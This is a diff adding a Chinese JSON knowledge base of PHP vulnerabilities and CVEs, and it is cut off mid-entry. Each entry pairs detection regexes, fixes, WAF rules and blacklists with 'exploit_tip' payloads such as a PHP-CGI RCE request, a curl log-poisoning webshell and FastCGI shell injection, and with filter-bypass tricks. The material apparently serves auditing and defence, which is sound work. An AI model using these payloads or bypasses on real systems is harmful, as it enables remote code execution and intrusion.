@@ -1,0 +1,1350 @@
+[
+ {
+  "name": "PHP-CGI 参数注入（CVE-2024-4577 / CVE-2024-8926）",
+  "category": "rce",
+  "language": "php",
+  "framework": "php-cgi",
+  "severity": "critical",
+  "description": "Windows 下 PHP-CGI 把 best-fit 映射后的字符（如 0xAD 软连字符）误当成命令行参数分隔符，攻击者用 ?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input 即可在 php-cgi.exe 上执行任意 PHP 代码。Linux 侧对应 CVE-2024-8926（Windows-only 修正不完整）。",
+  "danger_functions": [
+   "php-cgi",
+   "php-cgi.exe",
+   "cgi-fcgi"
+  ],
+  "code_patterns": [
+   "php-cgi",
+   "cgi.force_redirect",
+   "x-cgi"
+  ],
+  "input_sources": [
+   "REMOTE_ADDR",
+   "QUERY_STRING",
+   "REDIRECT_STATUS"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbcve-4577-1",
+    "name": "PHP-CGI 软连字符参数注入",
+    "type": "regex",
+    "pattern": "(?i)(php-cgi|php-cgi\\.exe)[^\\n]{0,80}(-d\\s|allow_url_include|auto_prepend_file)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "请求行/配置中出现 php-cgi 配合 -d 参数或软连字符 0xAD"
+   },
+   {
+    "rule_id": "kbcve-4577-2",
+    "name": "auto_prepend_file 注入",
+    "type": "regex",
+    "pattern": "(?i)auto_prepend_file\\s*=\\s*(php://input|data://|/tmp/|\\.\\.)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "auto_prepend_file 指向可写/流包装地址"
+   },
+   {
+    "rule_id": "kbcve-4577-3",
+    "name": "cgi.force_redirect 关闭",
+    "type": "keyword",
+    "pattern": "cgi\\.force_redirect\\s*=\\s*(0|Off)",
+    "severity": "high",
+    "priority": 3,
+    "description": "关闭 force_redirect 后 CGI 可直接被外部调用"
+   }
+  ],
+  "fix_fast_method": "升级 PHP ≥ 8.3.8 / 8.2.20 / 8.1.29；临时缓解在 httpd.conf 增加\nRewriteRule ^ - [E=REDIRECT_STATUS:200] 并禁用 php-cgi 目录直接访问。",
+  "fix_secure_method": "迁移到 php-fpm（非 CGI 模式）并绑定 127.0.0.1:9000；Web 服务器禁止 .php 目录穿越与 %AD 等非 ASCII 路径；\n用 try_files $uri =404; 兜底，配合 open_basedir 与 disable_functions 收敛影响面。",
+  "fix_code_example": "# httpd.conf / .htaccess 临时缓解\nRewriteEngine On\nRewriteCond %{QUERY_STRING} ^%ad [NC]\nRewriteRule .* - [F,L]\n\n# php.ini\ncgi.force_redirect = 1\nexpose_php = Off",
+  "fix_code_language": "apache",
+  "fix_summary": "Windows 下 PHP-CGI 字符映射绕过导致参数注入 → RCE，必须升级到修复版本。",
+  "exploit_tip": "GET /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1\nContent-Length: 32\n\n<?php system('whoami');?>",
+  "waf_template": "location ~ \\.php$ {\n  if ($args ~* \"%ad\") { return 403; }\n  fastcgi_pass 127.0.0.1:9000;\n}",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "%ad,allow_url_include,auto_prepend_file,php-cgi",
+  "framework_fix": "升级 PHP；无法升级时用 Apache Rewrite 拦截 %AD 查询串，并在 WAF 阻断 php://input 出现在参数名中。",
+  "bypass_methods": [
+   "%AD → %25AD 双重编码",
+   "0xAD 大小写混写 %ad/%AD",
+   "+ 与 %20 混用分隔参数"
+  ],
+  "false_positive": "误报：正常业务不会在查询串使用 %AD 或 auto_prepend_file。",
+  "tags": "cve-2024-4577,php-cgi,rce,windows",
+  "references": [
+   "https://nvd.nist.gov/vuln/detail/CVE-2024-4577",
+   "https://devco.re/blog/2024/06/07/php-cgi-cve-2024-4577/"
+  ]
+ },
+ {
+  "name": "PHP-FPM 路径信息下溢（CVE-2019-11043）",
+  "category": "rce",
+  "language": "php",
+  "framework": "php-fpm",
+  "severity": "critical",
+  "description": "nginx 的 fastcgi_split_path_info 配置缺陷配合 PATH_INFO 尾部换行，使 FPM 的 env_path_info 指针下溢，可改写 FPM 内存中的 fastcgi 变量从而执行任意代码（经典 PHuiP-FPizdaM）。",
+  "danger_functions": [
+   "fastcgi_pass",
+   "php-fpm",
+   "fpm"
+  ],
+  "code_patterns": [
+   "fastcgi_split_path_info",
+   "PATH_INFO",
+   "try_files"
+  ],
+  "input_sources": [
+   "REQUEST_URI",
+   "PATH_INFO"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbcve-11043-1",
+    "name": "nginx PATH_INFO 配置缺陷",
+    "type": "regex",
+    "pattern": "fastcgi_split_path_info\\s+\\^(.+?)\\\\\\.php",
+    "severity": "high",
+    "priority": 2,
+    "description": "split_path_info 正则未锚定结尾，易受换行截断"
+   },
+   {
+    "rule_id": "kbcve-11043-2",
+    "name": "缺少 try_files 兜底",
+    "type": "regex",
+    "pattern": "location\\s+~\\s+[^\\{]*\\\\\\.php[^\\{]*\\{[^}]{0,200}fastcgi_pass",
+    "severity": "high",
+    "priority": 2,
+    "description": "fastcgi 段落内没有 try_files $uri =404，可被构造不存在的 .php 路径"
+   },
+   {
+    "rule_id": "kbcve-11043-3",
+    "name": "fastcgi_param PATH_INFO 未过滤",
+    "type": "keyword",
+    "pattern": "fastcgi_param\\s+PATH_INFO\\s+\\$fastcgi_path_info",
+    "severity": "medium",
+    "priority": 3,
+    "description": "直接透传 PATH_INFO 未做换行过滤"
+   }
+  ],
+  "fix_fast_method": "# nginx 加一行兜底即可阻断\nlocation ~ [^/]\\.php(/|$) {\n    try_files $uri =404;\n    fastcgi_pass 127.0.0.1:9000;\n}",
+  "fix_secure_method": "升级 PHP ≥ 7.1.33 / 7.2.24 / 7.3.11；同时把 nginx 的 fastcgi_split_path_info 锚定到 $，\n并把 PATH_INFO 白名单化（只允许 [A-Za-z0-9_\\-/\\.]+）。",
+  "fix_code_example": "location ~ [^/]\\.php(/|$) {\n    try_files $uri =404;\n    fastcgi_split_path_info ^(.+?\\.php)(/.*)$;\n    fastcgi_param PATH_INFO $fastcgi_path_info;\n    fastcgi_pass 127.0.0.1:9000;\n}",
+  "fix_code_language": "nginx",
+  "fix_summary": "FPM PATH_INFO 下溢可直接 RCE，加 try_files 兜底 + 升级 PHP 双保险。",
+  "exploit_tip": "python3 phuip-fpizdam.py http://target/index.php\n# 成功后 http://target/index.php?a=id",
+  "waf_template": "location ~ [^/]\\.php(/|$) { try_files $uri =404; }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "%0a,path_info,fastcgi_split_path_info",
+  "framework_fix": "升级 PHP 并补 try_files；WAF 阻断 URL 中裸 %0A/%0D 与超长 PATH_INFO。",
+  "bypass_methods": [
+   "PATH_INFO 尾部 %0A 换行",
+   "大小写 %0a / %0A 混写",
+   "叠加 ../ 增加路径长度"
+  ],
+  "false_positive": "误报：正常 PATH_INFO 不含换行符。",
+  "tags": "cve-2019-11043,php-fpm,nginx,rce",
+  "references": [
+   "https://nvd.nist.gov/vuln/detail/CVE-2019-11043",
+   "https://github.com/neex/phuip-fpizdam"
+  ]
+ },
+ {
+  "name": "glibc iconv 溢出 → php://filter 全链 RCE（CVE-2024-2961）",
+  "category": "lfi",
+  "language": "php",
+  "framework": "",
+  "severity": "critical",
+  "description": "glibc 的 ISO-2022-CN-EXT 转换器存在 1~3 字节堆溢出（CVE-2024-2961），配合 php://filter 的 convert.iconv 过滤器链可在 PHP 进程内实现任意地址写，进而执行命令；PHP 侧对应 CVE-2024-2961 未单独修复。",
+  "danger_functions": [
+   "iconv",
+   "php://filter",
+   "convert.iconv"
+  ],
+  "code_patterns": [
+   "php://filter",
+   "convert.iconv",
+   "resource="
+  ],
+  "input_sources": [
+   "$_GET",
+   "$_POST",
+   "include",
+   "file_get_contents"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbcve-2961-1",
+    "name": "php://filter convert.iconv 链",
+    "type": "regex",
+    "pattern": "php://filter[^\\s'\\\"]*convert\\.iconv",
+    "severity": "critical",
+    "priority": 1,
+    "description": "出现 php://filter 与 convert.iconv 组合"
+   },
+   {
+    "rule_id": "kbcve-2961-2",
+    "name": "iconv 危险编码",
+    "type": "regex",
+    "pattern": "(?i)(ISO-2022-CN-EXT|CSISO2022CN|ISO2022CNEXT)",
+    "severity": "high",
+    "priority": 2,
+    "description": "使用存在溢出的 ISO-2022-CN-EXT 编码"
+   },
+   {
+    "rule_id": "kbcve-2961-3",
+    "name": "多重过滤器拼接",
+    "type": "regex",
+    "pattern": "php://filter(/[a-z\\-]+=[^/|]+){3,}",
+    "severity": "high",
+    "priority": 2,
+    "description": "单次请求串联 3 个以上过滤器，典型过滤链利用"
+   }
+  ],
+  "fix_fast_method": "在 php.ini 中禁用危险流：allow_url_fopen=Off、allow_url_include=Off；\n无法升级 glibc 时用 disable_functions=iconv,iconv_strlen 阻断。",
+  "fix_secure_method": "升级 glibc ≥ 2.39-r5 / 发行版补丁（Debian 2.36-9+deb12u6、Ubuntu 2.39-0ubuntu8.2）；\n应用层对 include/file_get_contents 的参数做 basename 白名单，禁止出现 php:// 协议。",
+  "fix_code_example": "// 不安全\ninclude($_GET['f']);\n// 修复：只允许固定白名单\n$allow = ['home','about','help'];\n$f = $_GET['f'] ?? 'home';\nif (!in_array($f, $allow, true)) { die('bad'); }\ninclude __DIR__.\"/pages/{$f}.php\";",
+  "fix_code_language": "php",
+  "fix_summary": "php://filter 过滤链可把任意文件包含升级为 RCE，必须禁止协议前缀并升级 glibc。",
+  "exploit_tip": "$chain = 'php://filter/convert.iconv.UTF8.CSISO2022CN|convert.base64-encode/resource=/etc/passwd';\n# 结合 cnext-exploits / wrapwrap 生成溢出 payload",
+  "waf_template": "location ~ \\.php$ { if ($args ~* \"php://\") { return 403; } }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "php://filter,convert.iconv,ISO-2022-CN-EXT",
+  "framework_fix": "禁止 php:// 协议进入 include；升级 glibc；WAF 阻断 convert.iconv 关键字。",
+  "bypass_methods": [
+   "大小写 convert.Iconv",
+   "过滤器链中插入 base64 混淆",
+   "用 data:// 替代 php:// 绕过前缀检测"
+  ],
+  "false_positive": "误报：合法业务极少在参数中出现 php://filter 与 iconv 组合。",
+  "tags": "cve-2024-2961,glibc,php-filter,rce",
+  "references": [
+   "https://nvd.nist.gov/vuln/detail/CVE-2024-2961",
+   "https://www.ambionics.io/blog/php-filter-chains"
+  ]
+ },
+ {
+  "name": "PHP phar:// 反序列化",
+  "category": "deserialization",
+  "language": "php",
+  "framework": "",
+  "severity": "high",
+  "description": "phar 扩展在解析 phar:// 路径时会自动反序列化归档内的 meta-data，任何接收文件路径的 file 函数（file_exists、getimagesize、is_dir、filesize 等）都能触发，无需 unserialize。",
+  "danger_functions": [
+   "phar://",
+   "Phar",
+   "file_exists",
+   "getimagesize"
+  ],
+  "code_patterns": [
+   "phar://",
+   "Phar::",
+   "__destruct"
+  ],
+  "input_sources": [
+   "$_GET",
+   "$_POST",
+   "$_FILES"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbphp-phar-1",
+    "name": "phar 协议路径",
+    "type": "regex",
+    "pattern": "phar://",
+    "severity": "high",
+    "priority": 1,
+    "description": "出现 phar:// 流包装"
+   },
+   {
+    "rule_id": "kbphp-phar-2",
+    "name": "文件函数接收用户输入",
+    "type": "regex",
+    "pattern": "(file_exists|getimagesize|is_dir|filesize|filemtime|md5_file|stat)\\s*\\(\\s*\\$_(GET|POST|REQUEST)",
+    "severity": "high",
+    "priority": 2,
+    "description": "文件元数据函数直接使用用户输入，可触发 phar 反序列化"
+   },
+   {
+    "rule_id": "kbphp-phar-3",
+    "name": "POP 链魔术方法",
+    "type": "regex",
+    "pattern": "function\\s+__destruct\\s*\\([^)]*\\)\\s*\\{[\\s\\S]{0,300}(unlink|file_put_contents|system|eval|call_user_func)",
+    "severity": "medium",
+    "priority": 3,
+    "description": "魔术方法内存在危险操作，易构成 POP 链"
+   }
+  ],
+  "fix_fast_method": "在入口统一过滤：$f = str_replace(['phar://','php://','file://'], '', $_GET['f']);",
+  "fix_secure_method": "对所有文件路径参数使用 basename() + 白名单后缀校验；升级 PHP ≥ 8.0 并设置 phar.readonly=On（默认）；\n在 disable_functions 中禁用 phar 相关高危函数不可行时，用 open_basedir 限制可读目录。",
+  "fix_code_example": "$f = $_GET['f'] ?? '';\n$f = basename($f);\nif (!preg_match('/^[\\w\\-]+\\.(png|jpg)$/', $f)) { die('bad'); }\n$p = __DIR__.'/upload/'.$f;\nif (!is_file($p)) { die('404'); }\n",
+  "fix_code_language": "php",
+  "fix_summary": "phar:// 让任意文件函数变成反序列化入口，路径参数必须 basename + 白名单。",
+  "exploit_tip": "# 生成 phar 并改名为图片上传\n$p = new Phar('/tmp/a.phar');\n$p->startBuffering();\n$p['x']='<?php ?>';\n$p->setStub(\"GIF89a<?php __HALT_COMPILER(); ?>\");\n$p['x'] = new Evil();\n$p->stopBuffering();\nrename('/tmp/a.phar','a.gif');",
+  "waf_template": "if (preg_match('/(phar|php|file|data|zip):\\/\\//i', $input)) { reject(); }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "phar://,php://,file://,data://",
+  "framework_fix": "在入口 strip 协议前缀；禁止 phar 反序列化（PHP8 后仍需 phar.readonly 配合）；WAF 拦截 phar:// 与 __HALT_COMPILER。",
+  "bypass_methods": [
+   "phar%3A//",
+   "phar://./",
+   "大写 PHAR://",
+   "多协议嵌套 php://filter/resource=phar://"
+  ],
+  "false_positive": "误报：业务代码若显式使用 phar 读取归档需放行。",
+  "tags": "phar,deserialization,pop-chain,php",
+  "references": [
+   "https://www.php.net/manual/en/phar.using.object.php"
+  ]
+ },
+ {
+  "name": "PHP-FPM 未授权 FastCGI 直连注入",
+  "category": "rce",
+  "language": "php",
+  "framework": "",
+  "severity": "critical",
+  "description": "php-fpm 监听 0.0.0.0:9000 且未配置 allowed_clients 时，攻击者可直接构造 FastCGI 协议包，设置 SCRIPT_FILENAME 为任意路径并配合 auto_prepend_file 执行代码。",
+  "danger_functions": [
+   "fastcgi",
+   "php-fpm",
+   "SCRIPT_FILENAME"
+  ],
+  "code_patterns": [
+   "listen = 0.0.0.0:9000",
+   "listen.allowed_clients",
+   "SCRIPT_FILENAME"
+  ],
+  "input_sources": [
+   "9000/tcp"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbphp-fpm-1",
+    "name": "FPM 监听公网",
+    "type": "regex",
+    "pattern": "listen\\s*=\\s*(0\\.0\\.0\\.0|\\[::\\]):9000",
+    "severity": "critical",
+    "priority": 1,
+    "description": "php-fpm 监听所有网卡，可被外部直连"
+   },
+   {
+    "rule_id": "kbphp-fpm-2",
+    "name": "allowed_clients 缺失",
+    "type": "regex",
+    "pattern": "listen\\.allowed_clients\\s*=\\s*[0-9]",
+    "severity": "high",
+    "priority": 2,
+    "description": "allowed_clients 未限制为本机"
+   },
+   {
+    "rule_id": "kbphp-fpm-3",
+    "name": "SCRIPT_FILENAME 可控",
+    "type": "keyword",
+    "pattern": "SCRIPT_FILENAME",
+    "severity": "medium",
+    "priority": 3,
+    "description": "代码中出现 SCRIPT_FILENAME 赋值需审计来源"
+   }
+  ],
+  "fix_fast_method": "php-fpm.conf: listen = 127.0.0.1:9000  # 或 unix socket\nlisten.allowed_clients = 127.0.0.1",
+  "fix_secure_method": "改用 unix socket（listen = /run/php/php-fpm.sock）并设置 660 权限 + www-data 属组；\n容器内把 9000 端口仅暴露给 nginx 所在网络，禁止宿主机端口映射。",
+  "fix_code_example": "; /etc/php/8.2/fpm/pool.d/www.conf\nlisten = /run/php/php-fpm.sock\nlisten.owner = www-data\nlisten.group = www-data\nlisten.mode = 0660\n",
+  "fix_code_language": "ini",
+  "fix_summary": "FPM 端口暴露等于直接给 RCE，必须只监听本机或 unix socket。",
+  "exploit_tip": "python3 fpm.py -c '<?php echo shell_exec($_GET[1]);?>' -p 9000 127.0.0.1 /var/www/html/index.php\n# 或使用 gopher:// 从 SSRF 打通 FPM",
+  "waf_template": "location ~ \\.php$ { fastcgi_pass unix:/run/php/php-fpm.sock; }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "9000,fastcgi,SCRIPT_FILENAME",
+  "framework_fix": "只监听 unix socket；防火墙阻断 9000 入站；WAF/IDS 检测裸 FastCGI 二进制流量。",
+  "bypass_methods": [
+   "SSRF → gopher:// 打 9000",
+   "IPv6 [::]:9000 绕过 ACL",
+   "通过 Redis 主从写 FastCGI 包"
+  ],
+  "false_positive": "误报：仅当配置文本中出现公网监听时告警。",
+  "tags": "php-fpm,fastcgi,rce,unauth",
+  "references": [
+   "https://www.php.net/manual/en/install.fpm.configuration.php"
+  ]
+ },
+ {
+  "name": "PHP 动态函数调用与回调注入",
+  "category": "rce",
+  "language": "php",
+  "framework": "",
+  "severity": "high",
+  "description": "$func($arg) 形式的可变函数调用、call_user_func、array_map 的第二参数若来自用户输入，可直接调用 system/eval 等危险函数；常与过滤黑名单配合被绕过。",
+  "danger_functions": [
+   "call_user_func",
+   "call_user_func_array",
+   "array_map",
+   "usort",
+   "create_function"
+  ],
+  "code_patterns": [
+   "$func(",
+   "call_user_func",
+   "array_map",
+   "preg_replace /e"
+  ],
+  "input_sources": [
+   "$_GET",
+   "$_POST",
+   "$_REQUEST",
+   "$_COOKIE"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbphp-dyn-1",
+    "name": "可变函数调用用户输入",
+    "type": "regex",
+    "pattern": "\\$_(GET|POST|REQUEST|COOKIE)\\s*\\[[^\\]]+\\]\\s*\\(",
+    "severity": "critical",
+    "priority": 1,
+    "description": "直接用超全局数组作为函数名调用"
+   },
+   {
+    "rule_id": "kbphp-dyn-2",
+    "name": "call_user_func 用户输入",
+    "type": "regex",
+    "pattern": "call_user_func(_array)?\\s*\\(\\s*\\$_(GET|POST|REQUEST|COOKIE)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "call_user_func 回调名来自用户输入"
+   },
+   {
+    "rule_id": "kbphp-dyn-3",
+    "name": "array_map 回调可控",
+    "type": "regex",
+    "pattern": "array_map\\s*\\(\\s*\\$_(GET|POST|REQUEST)",
+    "severity": "high",
+    "priority": 2,
+    "description": "array_map 回调名来自用户输入"
+   }
+  ],
+  "fix_fast_method": "白名单：$allow = ['trim','strtolower','htmlspecialchars']; if(!in_array($f,$allow,true)) die;",
+  "fix_secure_method": "彻底避免用户输入作为函数名；用 match/switch 显式分发；\n如需动态分发改用映射数组（$map = ['a'=>'funcA']; $fn = $map[$k] ?? null;）。",
+  "fix_code_example": "$map = ['upper' => 'strtoupper', 'lower' => 'strtolower'];\n$k = $_GET['op'] ?? '';\nif (!isset($map[$k])) { die('bad op'); }\n$map[$k]($_GET['s']);",
+  "fix_code_language": "php",
+  "fix_summary": "动态函数调用必须走白名单映射表，绝不能让用户输入直接成为函数名。",
+  "exploit_tip": "?op=system&cmd=id  →  若代码为 $op($_GET['cmd']) 则直接 RCE\n?f=assert&x=phpinfo()  （PHP<8 assert 是函数）",
+  "waf_template": "if (preg_match('/\\$_(GET|POST|REQUEST|COOKIE)\\s*\\[[^\\]]*\\]\\s*\\(/', $code)) { reject(); }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "call_user_func,array_map,usort,assert,eval",
+  "framework_fix": "改为映射数组分发；WAF 拦截 $_(GET|POST)[...]( 形式。",
+  "bypass_methods": [
+   "大小写 SysTem",
+   "字符串拼接 'sys'.'tem'",
+   "chr(115).chr(121)...",
+   "assert 替代 eval"
+  ],
+  "false_positive": "误报：框架内部使用 call_user_func 传类方法是正常的，需看参数来源。",
+  "tags": "php,dynamic-call,rce,callback",
+  "references": [
+   "https://www.php.net/manual/en/functions.variable-functions.php"
+  ]
+ },
+ {
+  "name": "PHP 弱类型比较绕过",
+  "category": "auth-bypass",
+  "language": "php",
+  "framework": "",
+  "severity": "high",
+  "description": "== 松散比较下 \"0e123\" == \"0e456\" 为真、\"admin\" == 0 在 PHP<8 为真，常见于验证码/密码哈希/签名比对，可绕过登录或支付校验。",
+  "danger_functions": [
+   "==",
+   "in_array",
+   "strcmp",
+   "md5"
+  ],
+  "code_patterns": [
+   "==",
+   "in_array(",
+   "strcmp("
+  ],
+  "input_sources": [
+   "$_GET",
+   "$_POST",
+   "$_COOKIE"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbphp-loose-1",
+    "name": "松散比较哈希",
+    "type": "regex",
+    "pattern": "(md5|sha1)\\s*\\([^)]*\\)\\s*==\\s*\\$",
+    "severity": "high",
+    "priority": 1,
+    "description": "哈希结果使用 == 比较，可用 0e 魔术哈希绕过"
+   },
+   {
+    "rule_id": "kbphp-loose-2",
+    "name": "in_array 未严格",
+    "type": "regex",
+    "pattern": "in_array\\s*\\([^,]+,[^,)]+\\)\\s*[;)]",
+    "severity": "medium",
+    "priority": 2,
+    "description": "in_array 缺少第三个参数 true"
+   },
+   {
+    "rule_id": "kbphp-loose-3",
+    "name": "strcmp 返回值判断",
+    "type": "regex",
+    "pattern": "strcmp\\s*\\([^)]*\\)\\s*==\\s*0",
+    "severity": "medium",
+    "priority": 2,
+    "description": "strcmp 传数组会返回 NULL，NULL==0 为真"
+   }
+  ],
+  "fix_fast_method": "把 == 全部改为 ===；in_array 补第三个参数 true。",
+  "fix_secure_method": "统一使用 hash_equals() 做哈希比对；密码校验用 password_verify()；\n开启 declare(strict_types=1) 并升级 PHP 8（PHP8 起 \"admin\"==0 为 false）。",
+  "fix_code_example": "// 不安全\nif (md5($p) == $stored) {}\n// 修复\nif (hash_equals($stored, md5($p))) {}\nif (!in_array($v, $allow, true)) { die; }",
+  "fix_code_language": "php",
+  "fix_summary": "松散比较是 PHP 特有逻辑漏洞，一律使用 === 与 hash_equals。",
+  "exploit_tip": "?password[]=x 使 strcmp 返回 NULL 绕过\n?code=0e123456789 匹配 0e 开头的 MD5",
+  "waf_template": "if (preg_match('/(md5|sha1)\\s*\\([^)]*\\)\\s*==/', $code)) { warn(); }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "==,in_array,strcmp,md5",
+  "framework_fix": "改 === / hash_equals / password_verify；WAF 拦截参数名带 [] 的密码字段。",
+  "bypass_methods": [
+   "0e 魔术哈希（QNKCDZO、240610708）",
+   "传数组让 strcmp 报错返回 NULL",
+   "传数组让 md5 报错返回 NULL"
+  ],
+  "false_positive": "误报：== 用于整数比较是常见写法，需结合是否涉及认证判断。",
+  "tags": "php,type-juggling,auth-bypass",
+  "references": [
+   "https://www.php.net/manual/en/language.operators.comparison.php"
+  ]
+ },
+ {
+  "name": "PHP 变量覆盖（extract / parse_str / $$）",
+  "category": "auth-bypass",
+  "language": "php",
+  "framework": "",
+  "severity": "high",
+  "description": "extract($_GET)、parse_str($str)、$$key 循环赋值会把外部输入写成局部变量，覆盖 $is_admin、$role、$token 等关键变量从而越权。",
+  "danger_functions": [
+   "extract",
+   "parse_str",
+   "import_request_variables",
+   "$$"
+  ],
+  "code_patterns": [
+   "extract(",
+   "parse_str(",
+   "$$"
+  ],
+  "input_sources": [
+   "$_GET",
+   "$_POST",
+   "$_REQUEST"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbphp-var-1",
+    "name": "extract 使用超全局",
+    "type": "regex",
+    "pattern": "extract\\s*\\(\\s*\\$_(GET|POST|REQUEST|COOKIE|SERVER)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "extract 直接展开用户输入"
+   },
+   {
+    "rule_id": "kbphp-var-2",
+    "name": "parse_str 单参数",
+    "type": "regex",
+    "pattern": "parse_str\\s*\\(\\s*[^,)]+\\)\\s*;",
+    "severity": "high",
+    "priority": 2,
+    "description": "parse_str 第二个参数缺省时会写入当前作用域"
+   },
+   {
+    "rule_id": "kbphp-var-3",
+    "name": "可变变量赋值",
+    "type": "regex",
+    "pattern": "\\$\\$\\w+\\s*=",
+    "severity": "medium",
+    "priority": 3,
+    "description": "出现 $$ 形式变量赋值"
+   }
+  ],
+  "fix_fast_method": "parse_str($q, $out); 显式指定输出数组；extract 加 EXTR_SKIP 并只从已校验数组提取。",
+  "fix_secure_method": "禁止 extract 处理外部输入；改用显式赋值 $id = (int)($_GET['id'] ?? 0)；\n所有关键判断（is_admin/role）从服务端会话读取，不从请求参数读取。",
+  "fix_code_example": "$q = $_SERVER['QUERY_STRING'] ?? '';\nparse_str($q, $out);\n$id = (int)($out['id'] ?? 0);\n// 权限一律来自 session\n$isAdmin = !empty($_SESSION['is_admin']);",
+  "fix_code_language": "php",
+  "fix_summary": "变量覆盖会直接改写权限判断变量，必须禁用 extract/单参 parse_str。",
+  "exploit_tip": "?is_admin=1&role=admin  →  覆盖后进入后台",
+  "waf_template": "if (preg_match('/extract\\s*\\(\\s*\\$_(GET|POST|REQUEST)/', $code)) { reject(); }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "extract,parse_str,$$",
+  "framework_fix": "禁用 extract；parse_str 必须传第二参数；权限判断只读 session。",
+  "bypass_methods": [
+   "parse_str 换行绕过",
+   "$${'G'.'ETS'} 拼接",
+   "register_globals 遗留（PHP<5.4）"
+  ],
+  "false_positive": "误报：模板引擎内部 extract 渲染变量属正常，需看数据来源。",
+  "tags": "php,variable-overwrite,auth-bypass",
+  "references": [
+   "https://www.php.net/manual/en/function.parse-str.php"
+  ]
+ },
+ {
+  "name": "PHP 任意文件写入 / 日志投毒链",
+  "category": "file-write",
+  "language": "php",
+  "framework": "",
+  "severity": "high",
+  "description": "file_put_contents、fwrite、error_log 的路径或内容可控时可直接写 webshell；即使不能写 web 目录，也可投毒 nginx/apache 日志、/proc/self/environ、session 文件，再配合 LFI 执行。",
+  "danger_functions": [
+   "file_put_contents",
+   "fwrite",
+   "error_log",
+   "fopen",
+   "move_uploaded_file"
+  ],
+  "code_patterns": [
+   "file_put_contents(",
+   "fwrite(",
+   "error_log(",
+   "fopen("
+  ],
+  "input_sources": [
+   "$_GET",
+   "$_POST",
+   "$_FILES",
+   "User-Agent",
+   "Referer"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbphp-write-1",
+    "name": "文件写入路径可控",
+    "type": "regex",
+    "pattern": "(file_put_contents|fwrite|error_log)\\s*\\([^,]*\\$_(GET|POST|REQUEST|COOKIE)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "写入目标路径来自用户输入"
+   },
+   {
+    "rule_id": "kbphp-write-2",
+    "name": "写入内容可控",
+    "type": "regex",
+    "pattern": "(file_put_contents|fwrite)\\s*\\(\\s*[^,]+,\\s*\\$_(GET|POST|REQUEST)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "写入内容来自用户输入，可写入 PHP 代码"
+   },
+   {
+    "rule_id": "kbphp-write-3",
+    "name": "日志投毒入口",
+    "type": "regex",
+    "pattern": "(include|require)(_once)?\\s*\\(?[^;]*(\\\\.log|/proc/self|/var/log)",
+    "severity": "high",
+    "priority": 2,
+    "description": "包含日志或 proc 文件，可配合日志投毒 RCE"
+   }
+  ],
+  "fix_fast_method": "写入前 basename + 扩展名白名单；内容做 htmlspecialchars 或 base64 编码。",
+  "fix_secure_method": "上传目录放在 webroot 之外并用 nginx location 禁止执行；文件名用 uuid + 固定后缀；\n写入内容只允许 JSON 结构并用 json_encode 序列化，避免任何 PHP 语法进入文件。",
+  "fix_code_example": "$dir = '/data/uploads/';\n$name = bin2hex(random_bytes(8)).'.json';\n$data = json_encode(['ua'=>$_SERVER['HTTP_USER_AGENT'] ?? ''], JSON_UNESCAPED_UNICODE);\nfile_put_contents($dir.$name, $data, LOCK_EX);",
+  "fix_code_language": "php",
+  "fix_summary": "文件写入 + 可执行目录 = webshell；上传目录必须禁执行并随机命名。",
+  "exploit_tip": "# 日志投毒\ncurl -A '<?php system($_GET[1]);?>' http://t/\n# 再 LFI 包含 /var/log/nginx/access.log",
+  "waf_template": "location /uploads/ { location ~ \\.(php|phtml|phar)$ { deny all; } }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "file_put_contents,fwrite,error_log",
+  "framework_fix": "上传目录禁执行；写入内容结构化；WAF 拦截内容中的 <?php 与 <?=。",
+  "bypass_methods": [
+   "日志中插入换行拆分 payload",
+   "base64 + assert 组合",
+   "写入 .user.ini 配合 auto_prepend_file"
+  ],
+  "false_positive": "误报：正常业务写日志文件属常见，需看路径是否含用户输入。",
+  "tags": "php,file-write,log-poisoning,webshell",
+  "references": [
+   "https://www.php.net/manual/en/function.file-put-contents.php"
+  ]
+ },
+ {
+  "name": "PHP 信息泄露（phpinfo / 调试 / .git）",
+  "category": "info-leak",
+  "language": "php",
+  "framework": "",
+  "severity": "medium",
+  "description": "暴露 phpinfo()、ThinkPHP/Laravel debug 页面、.git/.svn、composer.lock、备份文件，会泄露绝对路径、数据库口令、内网地址与源码，是 AWD 中拿第一份凭据的最快路径。",
+  "danger_functions": [
+   "phpinfo",
+   "var_dump",
+   "print_r",
+   "debug"
+  ],
+  "code_patterns": [
+   "phpinfo(",
+   "APP_DEBUG",
+   "display_errors"
+  ],
+  "input_sources": [
+   "/phpinfo.php",
+   "/.git/config",
+   "/.env",
+   "/composer.lock"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbphp-info-1",
+    "name": "phpinfo 暴露",
+    "type": "regex",
+    "pattern": "phpinfo\\s*\\(\\s*\\)",
+    "severity": "medium",
+    "priority": 2,
+    "description": "代码中存在 phpinfo 调用"
+   },
+   {
+    "rule_id": "kbphp-info-2",
+    "name": "调试模式开启",
+    "type": "regex",
